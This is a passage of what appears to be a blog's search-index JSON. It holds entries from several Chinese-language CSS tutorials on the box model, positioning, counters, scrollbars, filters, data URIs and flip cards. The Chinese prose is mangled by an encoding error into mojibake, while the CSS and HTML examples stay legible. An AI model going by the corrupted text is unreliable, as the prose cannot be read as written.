çš„çµ•å°å®šä½ç¯„åœ","text":"æ‡¶äººåŒ…ç³»åˆ—ã€‚ ä¸åŒ…å« borderå­å±¤çš„å®šä½ç¯„åœåªåˆ°ã€Œçˆ¶å±¤çš„ border ä»¥å…§ã€ï¼Œçœ‹ä¸‹é¢å…©å€‹ä¾‹å­ã€‚ çˆ¶å±¤è¨­ paddingï¼š 1&lt;div class=\"box\"&gt;&lt;/div&gt; 12345678910111213141516171819.box { width: 100px; height: 100px; /* åªåŠ  padding */ padding: 10px; background-color: chartreuse; margin-top: 100px; margin: auto; position: relative;}.box::after { content: ''; position: absolute; top: 0; left: 0; width: 50px; height: 50px; background-color: violet;} Outputï¼š ç¾åœ¨åŠ ä¸Š borderï¼š 1234567891011121314151617181920.box { width: 100px; height: 100px; padding: 10px; /* åŠ ä¸Š border */ border: 10px solid red; background-color: chartreuse; margin-top: 100px; margin: auto; position: relative;}.box::after { content: ''; position: absolute; top: 0; left: 0; width: 50px; height: 50px; background-color: violet;}","link":"/2022/01/22/css-absolute-problem/"},{"title":"CSS ç›’æ¨¡å‹ï¼ˆbox-modelï¼‰","text":"å¤§å®¶éƒ½æ˜¯ç›’å­ã€‚ ç›’å­çš„æ§‹æˆä¸€å€‹ç›’å­æ˜¯ç”±å››å€‹å…ƒç´ ä¾†çµ„æˆçš„ï¼š content padding border marginï¼ˆé€™å€‹ä¸ç”¨ç®¡ï¼Œä»–å°±æ˜¯å¤–é–“è·ï¼Œå°ç›’å­æœ¬èº«æ²’æœ‰å¤ªå¤§å½±éŸ¿ï¼‰ å¾ˆå¸¸ç™¼ç”Ÿçš„å•é¡Œå‡è¨­ä½ æœ‰å€‹ç›’å­è¨­å®šæˆï¼š 1234.box { width: 200px; height: 100px;} ä½ å¯èƒ½æœƒä»¥ç‚ºç›’å­å¯¬é«˜å°±æ˜¯ 200 x 100ï¼š å¯æ˜¯å¦‚æœç¾åœ¨åŠ ä¸Š padding è·Ÿ borderï¼Œå°±è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£äº†ï¼š 123456.box { width: 200px; height: 100px; padding: 10px; border: 5px solid black;} ç¾åœ¨ç›’å­çš„å¯¬é«˜ä¸æ˜¯ 200 x 100 äº†ï¼Œå› ç‚º padding è·Ÿ border æœƒæ”¹è®Šç›’å­çš„å¤§å°ï¼Œå¯ä»¥æƒ³æˆæ˜¯ã€Œå¾ç›’å­è£¡å¾€å¤–åŠ å‡ºå»ã€ã€‚ å› æ­¤ç›’å­çš„å¯¬é«˜æ˜¯ï¼š230 x 130ï¼š å¯¬ = 200 + 20 + 10 = 230 é«˜ = 100 + 20 + 10 = 130 æ‰€ä»¥å¦‚æœä½ å¸Œæœ›ç›’å­çš„å¯¬é«˜æ˜¯ 200 x 100ï¼Œä½ å¾—æ”¹æˆé€™æ¨£è¨­å®šï¼š 12345678.box { /* 200 - 20 - 10 */ width: 170px; /* 100 - 20 - 10 */ height: 70px; padding: 10px; border: 5px solid black;} è§£æ±ºæƒ±äººçš„è¨ˆç®—å•é¡Œ box-sizingç‚ºäº†è§£æ±ºæ¯æ¬¡éƒ½è¦è¨ˆç®— border è·Ÿ padding çš„å•é¡Œï¼Œä½ å¯ä»¥ç”¨ box-sizing ä¾†æ”¹è®Šç›’å­çš„è¨ˆç®—æ–¹å¼ï¼š content-box åªè¨ˆç®—åˆ° content border-box æŠŠ border è·Ÿ padding åŒ…å«é€²ä¾† ç°¡å–®ä¾†èªªåªè¦ä½ è¨­å®šæˆ border-boxï¼Œå°±ä¸ç”¨å†å»ç®— padding è·Ÿ border ï¼Œå®ƒæœƒè‡ªå‹•å¹«ä½ è¨ˆç®—å¥½ã€‚ 1234567.box { box-sizing: border-box; width: 200px; height: 100px; padding: 10px; border: 5px solid black;} é€™æ¨£ç›’å­çš„å°ºå¯¸æ°¸é éƒ½æœƒæ˜¯ 200 x 100ï¼Œå†ä¹Ÿä¸ç”¨æ“”å¿ƒ padding è·Ÿ borderã€‚","link":"/2022/01/13/css-box-model/"},{"title":"CSS å‹•ç•«æ¼¢å ¡æŒ‰éˆ•","text":"æ”¾åœ¨é€™è£¡ä¹‹å¾Œè¦æ‹¿æ¯”è¼ƒæ–¹ä¾¿ã€‚ ç°¡è¿°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const HamburgerSecondWrapper = styled.button` position: relative; display: flex; justify-content: center; align-items: center; width: ${HamBurgerConfig.width}px; height: ${HamBurgerConfig.height}px; border: none; background-color: transparent; cursor: pointer; ${MEDIA_PC} { display: none; } ${({ $isMenuOpen }) =&gt; $isMenuOpen &amp;&amp; ` &amp; &gt; ${HamburgerSecondInner} { transform: rotate(135deg); } &amp; &gt; ${HamburgerSecondInner}::before { transform: rotate(90deg); } &amp; &gt; ${HamburgerSecondInner}::after { transform: rotate(90deg); } `}`;const HamburgerSecondInner = styled.span` width: ${HamBurgerConfig.width}px; height: ${HamBurgerConfig.weight}px; background-color: ${({ theme }) =&gt; theme.green_400}; transition: all 0.5s ease-in-out; border-radius: 4px; &amp;::before, &amp;::after { content: \"\"; position: absolute; left: 0; width: 32px; height: ${HamBurgerConfig.weight}px; border-radius: 4px; background-color: ${({ theme }) =&gt; theme.green_400}; transition: all 0.3s ease-in-out; } &amp;::before { transform: translateY( -${Math.floor((HamBurgerConfig.height - HamBurgerConfig.weight) / 2)}px ); } &amp;::after { transform: translateY( ${Math.floor((HamBurgerConfig.height - HamBurgerConfig.weight) / 2)}px ); }`; å…ƒä»¶ï¼š 123456&lt;HamburgerSecondWrapper $isMenuOpen={isMenuOpen} onClick={handleToggleMenu}&gt; &lt;HamburgerSecondInner /&gt;&lt;/HamburgerSecondWrapper&gt; æ•ˆæœï¼š","link":"/2022/04/13/css-burger-button/"},{"title":"ç¶²é ä¸­çš„è‹±æ–‡å¤§å°å¯«å•é¡Œ","text":"å†·å†·å†·ï¼Œæœ‰å¤ å†·çŸ¥è­˜ã€‚ ç‚ºä»€éº¼ä½ è©²ä½¿ç”¨ CSS ä¾†è¨­å®šä¸çŸ¥é“ä½ æœ‰æ²’æœ‰ç¢°éé€™å€‹å•é¡Œï¼Œæˆ‘è¦ºå¾—é€™å€‹å•é¡Œä¹Ÿè¨±é‚„è »å°‘äººçŸ¥é“çš„ã€‚ å‡è¨­æœ‰å€‹ HTML é•·é€™æ¨£ï¼š 1&lt;p&gt;THIS JOKE IS SO FUNNY.&lt;/p&gt; å¦‚æœä½ ç”¨ è¢å¹•é–±è®€å™¨ï¼ˆScreen readerï¼‰ ä¾†è·‘çš„è©±ï¼Œå®ƒæœƒã€Œä¸€å€‹å­—ä¸€å€‹å­—ä¾†å”¸ï¼ˆT-H-I-Sâ€¦.ï¼‰ã€ã€‚ æ‰€ä»¥ç‚ºäº†é¿å…é€™å€‹å•é¡Œï¼Œæ‡‰è©²é€™æ¨£å­åšï¼š 1&lt;p&gt;This is a funny joke/&lt;/p&gt; 123p { text-transform: uppercase;} é›–ç„¶æœ€å¾Œçµæœçœ‹èµ·ä¾†æœƒä¸€æ¨¡ä¸€æ¨£ï¼Œä½†æ˜¯è¢å¹•é–±è®€å™¨èƒ½å¤ æ­£å¸¸çš„å¿µå‡ºé€™æ®µæ•˜è¿°ã€‚","link":"/2022/01/16/css-case-problem/"},{"title":"CSS ä¸­çš„ counter å±¬æ€§","text":"ç”¨æ“¬å…ƒç´ ä¾†è‡ªè£½åˆ—è¡¨æ¸…å–®ã€‚ ä½œæ³•ç•¶ä½ æƒ³è¦ç”¢ç”Ÿä¸€ä¸²ã€ŒæŒ‰ç…§é †åºç·¨è™Ÿã€çš„å…ƒç´ æ™‚ï¼Œé™¤äº†ä½¿ç”¨ HTML ä¸­çš„ &lt;ol&gt; ä¹‹å¤–ï¼Œä½ ä¹Ÿèƒ½ç”¨ CSS ä¸­çš„ counter å±¬æ€§ä¾†å¯¦ä½œã€‚ è‡³æ–¼æ”¯æ´åº¦çš„è©±ä¸ç”¨æ“”å¿ƒï¼Œé™¤äº†èˆŠç‰ˆ IE éƒ½å¯ä»¥é‹ä½œï¼š ä½†è¦æ³¨æ„ï¼Œcounter æ˜¯åˆ©ç”¨æ“¬å…ƒç´ çš„ content å±¬æ€§ä¾†è¨­å®šæ•¸å­—çš„ï¼Œæ‰€ä»¥å¿…é ˆæ­é…æ“¬å…ƒç´ ä¾†ä½¿ç”¨ã€‚ ç›´æ¥ä¾†çœ‹ä¾‹å­å§ï¼š 123456789&lt;!-- ä¸€å€‹ box è£¡è£äº† 6 ç¨®é¡è‰²çš„æ–¹å¡Š --&gt;&lt;div class=\"box\"&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // åœ¨ç¥–å…ˆå…ƒç´ åˆå§‹åŒ–è¨ˆæ•¸å™¨ // çœ‹ä½ æƒ³å–ä»€éº¼åå­— counter-reset: order; // ä¹Ÿå¯ä»¥æŒ‡å®šåˆå§‹å€¼ï¼Œé€™æ¨£å°±æœƒå¾ 10 é–‹å§‹ç®— // å¦‚æœè¦é¡¯ç¤º 0, 1, 2... å¯ä»¥è¨­æˆ \"-1\" counter-reset: order 10;}.item::before { // æŠŠè¨ˆæ•¸å™¨çš„å€¼å¯«åˆ° content è£¡ content: counter(order); // å¡«å…¥è¦éå¢çš„è¨ˆæ•¸å™¨åç¨± counter-increment: order;} è¨­å®šå®Œæˆå¾Œï¼Œå°±èƒ½å¾—åˆ°ä»¥ä¸‹çµæœï¼š ğŸš€ Codepenï¼šé»é€™è£¡ æ›´å¤šçš„è¨­å®šç´°ç¯€ï¼Œå¯ä»¥åˆ°ä¸Šé¢ Codepen è£¡é¢çœ‹è¨»è§£ï¼Œæˆ–æ˜¯åƒè€ƒé€™è£¡ æœ€å¾Œåšä¸€äº›è£œå……ï¼š counter-resetå¯ä»¥è¨­å®šåœ¨ä»»ä½•çš„ã€Œç¥–å…ˆå…ƒç´ ã€ä¸Šï¼Œä¸ä¸€å®šè¦ç›´å±¬çˆ¶å±¤ã€‚ è¨ˆæ•¸å™¨æ˜¯é€é counter-increment ä¾†åšè¨ˆæ•¸ï¼Œæ‰€ä»¥è«‹è¨­å®šåœ¨è¦è¨ˆç®—çš„å…ƒç´ ä¸Šã€‚","link":"/2022/01/16/css-counter-property/"},{"title":"CSS ä¹‹æˆ‘çš„ scrollbar æ¯”è¼ƒå¥½çœ‹","text":"é‚„ä¸éŒ¯ç”¨ã€‚ ç”¨æ³•ä¸å–œæ­¡ç€è¦½å™¨çš„é è¨­æ»¾è»¸å—ï¼Ÿå‘Šè¨´ä½ ä¸€å€‹å¥½æ¶ˆæ¯ï¼Œå…¶å¯¦å¯ä»¥ç”¨ CSS æ”¹ã€‚ è¦è¨­å®šæ»¾è»¸æ¨£å¼å¯ä»¥ç”¨ ::-webkit-scrollbar ç›¸é—œçš„ pseudo-class ä¾†åšè¨­å®šï¼š 123456789101112131415161718// æ»¾è»¸çš„å®¹å™¨element::-webkit-scrollbar { // å‚ç›´æ»¾è»¸ width: 8px; // æ°´å¹³æ»¾è»¸ height: 8px; background-color: transparent;}// æ»¾è»¸çš„å…§å®¹å™¨element::-webkit-scrollbar-track { border-radius: 10px; background-color: transparent;}// ç”¨ä¾†æ»‘çš„é‚£ä¸€å¡Šæ±æ±element::-webkit-scrollbar-thumb { border-radius: 10px; background-color: #555;} é€™é‚Šé™„ä¸Šæˆ‘åƒåŠ  Frontend Mentor æŒ‘æˆ°ä¸­çš„ç¯„ä¾‹ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥åƒè€ƒä¸€ä¸‹ã€‚ ä¸éä½ æ‡‰è©²æœ‰æ³¨æ„åˆ°é—œéµå­—ï¼š webkit æ²’éŒ¯ï¼Œé€™å€‹æ–¹æ³•åªé©ç”¨æ–¼ Webkit ç€è¦½å™¨ï¼ˆChrome å’Œ Safariï¼‰ï¼Œå› æ­¤è¦åœ¨å…¶ä»–ç€è¦½å™¨ä¸Šæ”¹çš„è©±å¾—ç”¨ JavaScript æ‰æœ‰è¾¦æ³•ã€‚ æƒ³äº†è§£æ›´å¤šå¯ä»¥åƒè€ƒ é€™å€‹ç¶²ç«™","link":"/2022/01/16/css-customize-scrollbar/"},{"title":"CSSï¼å®¢è£½ File å…ƒä»¶","text":"ç¾åœ¨æ‰ç™¼ç¾çš„å°æŠ€å·§ã€‚ ç°¡è¿°ä»¥å¾€è¦åš File å…ƒä»¶æ™‚æˆ‘éƒ½æ˜¯ç”¨ absolute + opaicty çš„éšœçœ¼æ³•ä¾†æŠŠåŸç”Ÿå…ƒä»¶è¦†è“‹åœ¨å®¢åˆ¶å…ƒä»¶ä¸Šï¼Œå°±èƒ½äº«æœ‰åŸç”Ÿè‡ªå‹•è·³å‡º dialog çš„åŠŸèƒ½ã€‚ é€™é‚Šçš„ HTML å’Œ CSS å¤§æ¦‚æœƒé€™æ¨£è¨­è¨ˆï¼š 123456&lt;div class=\"custom-upload-wrapper\"&gt; &lt;div class=\"custom-upload-element\"&gt; &lt;span&gt;Filename goes here...&lt;/span&gt; &lt;input class=\"custom-upload-native\" type=\"file\" /&gt; &lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829.custom-upload-wrapper { margin: 20px auto; max-width: 300px; .custom-upload-element { position: relative; display: block; border: 1px solid #033076; border-radius: 4px; padding: 9px 10px; font-size: 14px; color: #021f54; transition: all 0.3s; &amp;:hover { box-shadow: 0 0 0 2px rgba(2, 31, 84, 0.2); } } .custom-upload-native { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; // hide native element opacity: 0; z-index: 999; text-indent: -999px; }} ä¸éå…¶å¯¦é™¤äº†é€™ç¨®ä½œæ³•ä¹‹å¤–ï¼Œæœ‰ä¸€å€‹æ›´ç°¡å–®çš„æŠ€å·§æ˜¯é€é &lt;label&gt; ä¾†è™•ç†ï¼Œé€™å€‹æŠ€å·§æ˜¯æŠŠ input file åŒ…åœ¨ &lt;label&gt; è£¡é¢ï¼Œä¸¦ä¸”è¨­ç‚º display: noneï¼š 1234&lt;label class=\"custom-upload-wrapper\"&gt; &lt;span class=\"custom-upload-element\"&gt;Filename goes here...&lt;/span&gt; &lt;input class=\"custom-upload-native\" type=\"file\" /&gt;&lt;/label&gt; ä½ æœƒç™¼ç¾ç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼Œç…§ç†èªªä½ æ‡‰è©²æ˜¯æ²’è¾¦æ³•é»æ“Šåˆ° input çš„ï¼Œä¸éå› ç‚º label çš„ç‰¹æ€§å°±æ˜¯æœƒæŠŠäº‹ä»¶åæ‡‰åˆ°å°æ‡‰çš„ input å…ƒä»¶ä¸Šï¼Œæ‰€ä»¥å³ä¾¿è¨­ç‚º display: none ä¹Ÿä¸€æ¨£èƒ½è§¸ç™¼ dialog çš„åŠŸèƒ½ï¼ æ‰€ä»¥ CSS å¯ä»¥ç°¡åŒ–è¨±å¤šï¼š 12345678910111213141516171819202122.custom-upload-wrapper { display: block; margin: 20px auto; max-width: 300px; .custom-upload-element { display: block; border: 1px solid #033076; border-radius: 4px; padding: 9px 10px; font-size: 14px; color: #021f54; transition: all 0.3s; cursor: pointer; &amp;:hover { box-shadow: 0 0 0 2px rgba(2, 31, 84, 0.2); } } // no need to worry about this .custom-upload-native { display: none; }} ç¾åœ¨äº‹æƒ…å¥½è¾¦äº†ï¼Œä½ å®Œå…¨ä¸éœ€è¦å°åŸç”Ÿå…ƒä»¶åšé¡å¤–è™•ç†ï¼Œåªè¦å°ˆæ³¨åœ¨ä½ çš„å®¢åˆ¶å…ƒä»¶ä¸Šå°±è¡Œäº†ã€‚ é€™é‚Šçš„å¯¦éš›ç¯„ä¾‹å¯ä»¥åˆ° Codepen ä¸Šåƒè€ƒã€‚","link":"/2022/08/29/css-customize-upload-component/"},{"title":"CSS åˆ©ç”¨ DataURI ä¾†ç¯€çœæµé‡","text":"ä¸€å€‹æˆ‘ç¾åœ¨æ‰çŸ¥é“çš„æ“ä½œã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠåœ–ç‰‡ç”¨ base64 ç·¨ç¢¼å¾Œå¯«åœ¨ HTML è£¡ï¼Œé€™æ¨£å°±ä¸éœ€è¦ç™¼ requestã€‚ é›–ç„¶çœ‹èµ·ä¾†å¥½åƒé‚„æ˜¯æœ‰ç™¼ requestï¼Œä½†å¯ä»¥æ³¨æ„åˆ° Time ç‚º 0ï¼Œæ‰€ä»¥é€™æ‡‰è©²ä¸ç®—ã€‚ å¯ä»¥åƒè€ƒä¸‹åœ–åšå€‹å°ç…§ï¼š ä¸Šé¢æ˜¯ base64 çš„ URIï¼Œä¸‹é¢æ˜¯ç”¨ä¸€èˆ¬çš„ URIã€‚ ç”¨æ³•æ ¼å¼çš„éƒ¨åˆ†å¾ˆç°¡å–®ï¼Œåªè¦é€™æ¨£å¯«å°±å¥½ï¼š data:[&lt;MIMEé¡å‹&gt;][;charset=&lt;charset&gt;][;ç·¨ç¢¼æ–¹æ³•],&lt;ç·¨ç¢¼è³‡æ–™&gt; MIME é¡å‹å¯ä»¥åƒè€ƒé€™è£¡ï¼šMIME types: Complete list of MIME types å› ç‚ºåªæ˜¯æŠŠè¦å¼•å…¥çš„æ±è¥¿æ›æ‰è€Œå·²ï¼Œæ‰€ä»¥ src è·Ÿ background-image éƒ½èƒ½ç”¨ï¼š 1&lt;img src=â€data:image/png;base64,iVBORw0KGgoAAAANSUhç•¥â€¦(å¾ˆé•·ä¸€ä¸²)â€ /&gt;` 123.element { background-image: url(â€˜data:image/png;base64,iVBORw0KGgoAAAANSUhç•¥â€¦â€™);} è‡³æ–¼æ€éº¼åš base64 ç·¨ç¢¼ï¼ŸGoogle ä¸€ä¸‹æ‡‰è©²å°±èƒ½æ‰¾åˆ°ç·šä¸Šç·¨ç¢¼æœå‹™ï¼Œä¸éæˆ‘æ˜¯ç¿’æ…£ç›´æ¥ç”¨ CLI æ¯”è¼ƒå¿«ï¼š 1cat button.png | base64 å¯¦ä½œé€™é‚Šæˆ‘æ‡¶ï¼Œæ‰€ä»¥å°±æ‹¿ CSS åˆ©ç”¨ Sprite ä¾†æå‡æ•ˆèƒ½ çš„ç¯„ä¾‹ä¾†æ”¹ï¼š 123456789button { width: 51px; height: 51px; background-image: url('data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAJoAAAAzCAIAAADgjoZmAAAEiklEQVR4nO2caUwVVxTH/4hgxAJaxYWiz/AIilbLHi01LoCNJV1j2zRETRupGI1GP/RDbWPS6gf7xbSxTU262KAYo42J3WyDicYmQrGySnCBqkCLyA4PZPccJNX3eESZO86Qm/MLTN4smXve/Oaee+4lAQOCRvjQ75KDGIPkboIENioosPF2xyCYiejUCtGpFaJTK0SnVohOrRCdWiE6tUJ0aoXo1ArRqRWiUytEp1aITq0QnVohOrVCdGqF6NQKc3SO80FsKOKfQWgg795uR1Et8qrQ02/K7YXHxQSdi2bgoxVwTHY7uG5Q6t5z+KtavYVRszEO6dGYOOzLdfaishHHSvDHdRui8mD6JGxbiusNOFRg2j1VdT4/B/tWw8+XtdFjulLPPXXxTGTEs+D9a7ArB2f/MSXUUfBuLHzHoaMHhf+h96EMERaMhdPxSTKaOpFfY3VUHmxfimQnUpworOU4TUFJ59QAfJrMLrOL8cWFB8dzKnD+Jj5cjhcj8H6CDTrJ5QD10ZOobPI8tXsl1kQiyWGzzsipWOVEXz+HmpmAzFPm3FZJ5zuLMckf5XdwINfzVFcvdp/hLtvWpdKCcVzdXlwSF2tYZ/+A5QG5k5kIH+CzP/HWs4iehSWzkVtlwm2VdC5z8PZ46YhP55crKrc3HxoIVobzhwKTkpsxaDCiQaq2nZ8PjQiU4TYljAGdYUG8La0zIQ7Tecofe1PcBk5ifghCg/BlHs7fsCeq+2xO5O3hQg7vTAXXGVEhWD4X55SjUtJJeZ/o7FEN4glBhcZw6l3w90WAH3cLW0gMQ8ws1HfgVDnvUmL7oQAfr+AigwoOxVFASSfV/TQZCJyAOpdSEE+Cu71I/d5z4jstAG8v4t5As+QtP9kTWOZg18wuQnff0JHT13hm5XwaqU78rjaDUtJ5o4mzBD2aikbvF1DpS33Xln5AeWz4Igb1ia/ysDoCcaGYHYyqFqujooy6IAQtd3Gy7MFBqm+zCvHBMmyMR04l7xpGSSfNQEhn+nM4fRVt3Z5nX3Dw6FVyG1t/VmnEZCiZuQZfr6AJVjdNhRhlVKKrDzuS3E7dD4besLTIoSRsDCWdJy7j1She2DvwMvacxbWGoeM0e1kXjfXR/AVIpy1QDHOCcWtY/6OSMnwKD1HVrVaHlBrBGRWD60GvzPd+zXux+O2q8cVRJZ00t9vxK/a/hHnTkLUWN5tR08ovGu36+fIj++ZvfHtRpQWDUNP0Jn33Bopr3YrbKRN5VYigHkAZz0qobMyI4w9f5+PQJS8XUAly5E3MDMRrC3juZwzVRT5SmH4cr0fxfI5ePcdkfpR3XLj0Ly8V/d9fLeZYCdYu5LkK9cWH6enDrWYuPbKKrA4pJZyXGBs7cbTY+wVtXTx12ZmEDTE4UQpjFa4JS/BU7JC57BGitIXPL/DPmKKqFQ0dOJjP62UjQTkjbR5nOMOzFfl7p0WU1SEt6xHX0ORqw49KrYhOrRCdWiE6tUJ0aoXo1ArRqRWiUytEp1aITq0QnVohOrVCdGqF6NQK0akXdv9/ZMFM7gEDz+rb9FQSCQAAAABJRU5ErkJggg=='); background-repeat: no-repeat; background-color: transparent; border: none; padding: 0;} è¼¸å‡ºçµæœï¼š ç¢ºèªä¸€æ¨£æ˜¯å¯ä»¥ work çš„ï¼ DataURI çš„ç¼ºé» ä¸æœƒ cacheï¼ˆä½†æˆ‘ä¸å¤ªç¢ºå®šç‚ºä»€éº¼ devtool é‚„æ˜¯æœƒé¡¯ç¤º memory cacheï¼‰ HTML å®¹é‡æœƒè®Šè‚¥ è½‰æˆ base64 å¾Œæœ‰å­—æ•¸é™åˆ¶ï¼ˆä»¥ Opera11 ä¾†èˆ‰ä¾‹çš„è©±æ˜¯ 65000 å€‹å­—å·¦å³ï¼‰","link":"/2022/03/05/css-datauri/"},{"title":"CSS ä¸­é‚£äº›å¸¸å¸¸å¿˜è¨˜çš„é è¨­å€¼","text":"è¨˜èµ·ä¾†æ–¹ä¾¿æŸ¥ã€‚ background background-color: transparent background-repeat: repeat background-attachment: scroll button æ¨™ç±¤ background-color border padding :focus æ™‚çš„ outline font-family font-size å­˜åœ¨æ–¼ &lt;form&gt; ä¸­çš„æŒ‰éˆ•ï¼Œæœƒè‡ªå‹•è¢«è¦–ç‚ºæ˜¯é€å‡ºè¡¨å–®çš„æŒ‰éˆ•ï¼Œæ‰€ä»¥æŒ‰ä¸‹æ™‚æœƒå‡ºç¾è·³è½‰çš„è¡Œç‚ºã€‚ a æ¨™ç±¤ text-decoration color display: inline input æ¨™ç±¤ :focus æ™‚çš„ outline padding border-style:inset flex-box flex-shrink: 1ï¼Œæ¯å€‹ item å¹³å‡å£“ç¸® align-items: stretchï¼Œæ¬¡è»¸ items ç­‰å¯¬ justify-content: flex-start ä¸»è»¸ä¸¦æ²’æœ‰ justify-self é€™å€‹å±¬æ€§","link":"/2022/01/16/css-default-value/"},{"title":"CSS ä¸­çš„ display å±¬æ€§","text":"display ä¸‰å…„å¼Ÿã€‚ blockä»£è¡¨å…ƒç´ ï¼š&lt;div&gt; &lt;h1&gt; &lt;p&gt; å¯è¨­å®šå¯¬é«˜ margin padding æ­£å¸¸ä½œç”¨ è‡ªå·±æœƒä½”æ“šä¸€æ•´è¡Œ inlineä»£è¡¨å…ƒç´ ï¼š&lt;span&gt; &lt;a&gt; ä¸èƒ½è¨­å¯¬é«˜ ä¸Šä¸‹ margin æ²’ç”¨ ä¸Šä¸‹ padding ä¸æœƒå½±éŸ¿æ—é‚Šå…ƒç´  inline-blockä»£è¡¨å…ƒç´ ï¼š&lt;input&gt; &lt;select&gt; å¯ä»¥è¨­å®šå¯¬é«˜ margin padding æ­£å¸¸ä½œç”¨ å¯ä»¥è·Ÿåˆ¥äººæ’å†ä¸€èµ·","link":"/2022/01/12/css-display/"},{"title":"CSS å¥½ç”¨çš„ filter å±¬æ€§","text":"åŠ ä¸Š filter å¾Œè³ªæ„Ÿç«‹é¦¬æå‡ï¼ åˆ—è¡¨ä¸»è¦æœƒç”¨åœ¨åœ–ç‰‡ä¸Šçš„å±¬æ€§ï¼ˆä½†ä¸åƒ…é™æ–¼åœ–ç‰‡ï¼‰ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æ¿¾é¡ï¼Œçœ‹ç¯„ä¾‹æœ€å¿«ï¼ filter: brightness() è¨­å®šæ˜äº®åº¦ 1234/* è¨­æˆ 150% ä¹Ÿå¯ä»¥ */img:hover { filter: brightness(1.5);} filter: blur() è¨­å®šæ¨¡ç³Š 123img:hover { filter: blur(2px);} filter: contrast() è¨­å®šå°æ¯”åº¦ 1234/* ä¹Ÿå¯ä»¥è¨­æˆ 1000% */img:hover { filter: contrast(10);} filter: drop-shadow() è¨­å®šé™°å½± 123img:hover { filter: drop-shadow(16px 16px 20px aqua);} è·Ÿ box-shadow çš„å·®ç•°æ˜¯å®ƒèƒ½åˆ¤æ–·é€æ˜çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ç›´æ¥åŠ åœ¨å¤–æ¡†ä¸Šï¼Œåƒè€ƒä¸‹åœ–ï¼š filter: grayscale() è¨­å®šç°éš 123img:hover { filter: grayscale(1);} filter: hue-rotate è‰²èª¿æ—‹éˆ• æš«æ™‚ä¸çŸ¥é“èƒ½åšä»€éº¼ï¼Œä½†å¾ˆé…·ï¼ 123456789101112img { animation-name: colorful; animation-duration: 2s;}@keyframes colorful { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); }} filter: invert è² ç‰‡æ•ˆæœ 1234/* æ³¨æ„åªæœ‰ 0 ~ 100% ä¹‹é–“çš„å€¼æœ‰æ•ˆ */img:hover { filter: invert(80%)} filter: saturate é£½å’Œåº¦ 123img:hover { filter: saturate(2)} filter: sepia æ‡·èˆŠæ•ˆæœ 1234/* é è¨­å€¼ç‚º0ï¼Œéœ€è¦ 0 ~ 1ä¹‹é–“çš„å€¼ */img:hover { filter: sepia(0.5)}","link":"/2022/01/28/css-filter/"},{"title":"CSSï¼Flip Card","text":"ä¹…é•çš„ CSSã€‚ ç°¡è¿°æœ‰äº›æ™‚å€™å¯èƒ½æœƒéœ€è¦ç”¨åˆ°é€™å€‹é…·ç‚«çš„æ•ˆæœï¼š åŸæœ¬æˆ‘ä»¥ç‚ºé€™å¾ˆé›£æï¼Œä¸éå­¸å®Œå¾Œç™¼ç¾å…¶å¯¦æ²’é‚£éº¼è¤‡é›œï¼Œæ‰€ä»¥å°±é †ä¾¿è¨˜éŒ„ä¸€ä¸‹å§ï¼ ç¯„ä¾‹åœ¨å¯« CSS å‰è¦å…ˆè§£é‡‹ä¸€ä¸‹ HTML çµæ§‹ã€‚ä¸ç”¨æƒ³å¾—å¤ªè² è²¬ï¼Œå…¶å¯¦å°±è·Ÿç¾å¯¦ä¸­çš„å¡ç‰‡ä¸€æ¨£ï¼Œä¸€å¼µå¡ç‰‡æœƒæœ‰æ­£é¢è·Ÿåé¢ï¼Œæ‰€ä»¥ HTML ä¹Ÿæœƒåˆ†æˆå…©å¡Šï¼Œä¸€å¡Šæ˜¯ã€Œæ­£é¢çš„å…§å®¹ã€ï¼Œä¸€å¡Šæ˜¯ã€Œåé¢çš„å…§å®¹ã€ï¼š 12345678&lt;div class=\"card\"&gt; &lt;div class=\"card__inner front\"&gt; &lt;p&gt;Front&lt;/p&gt; &lt;/div&gt; &lt;div class=\"card__inner back\"&gt; &lt;p&gt;Back&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; æˆ‘å€‘å…ˆåŠ ä¸Šä¸€äº›å¡ç‰‡çš„é è¨­æ¨£å¼ï¼š 123456789101112131415161718192021222324body { background-color: #1b1523; font-size: 2em; color: #fff;}.card { display: inline-block; margin: 40px;}.card__inner { width: 200px; height: 200px; display: flex;}.card__inner p { margin: auto;}.card .front { background: #2aac9e;}.card .back { background: #6351c3;} åŠ å®Œå¾Œï¼Œç•«é¢æ‡‰è©²æœƒé•·é€™æ¨£ï¼š æ¥ä¸‹ä¾†ï¼Œåœ¨å¡ç‰‡é‚„æ²’æœ‰è¢«ç¿»é¢å‰ï¼Œæˆ‘åªå¸Œæœ›ä»–é¡¯ç¤ºã€ŒBackã€çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æŠŠ .front éƒ¨åˆ†æ”¹æˆé€™æ¨£ï¼š 12345.card .front { position: absolute; transform: rotateY(90deg); background: #2aac9e;} çµæœå°±æœƒè®Šé€™æ¨£ï¼š æˆ‘ä¸€é–‹å§‹å¾ˆç–‘æƒ‘ï¼Œç‚ºä»€éº¼é€™æ¨£æ­£é¢å°±æ¶ˆå¤±äº†ï¼Ÿ é€™æ˜¯å› ç‚º absoulte è·Ÿ rotateY çš„è¨­å®šã€‚é †é“ä¸€æï¼Œä¸€ç›´åˆ°å¯«é€™ç¯‡ç­†è¨˜å¾Œæˆ‘æ‰çŸ¥é“ rotate åŸä¾†æ˜¯å¯ä»¥æŒ‡å®š Y è»¸è·Ÿ X è»¸çš„å€¼çš„ã€‚ é¦–å…ˆ absoulte æ˜¯ç‚ºäº†è®“ .front è„«é›¢ã€Œæ’ç‰ˆæµã€ï¼Œè—‰æ­¤è®“ .back 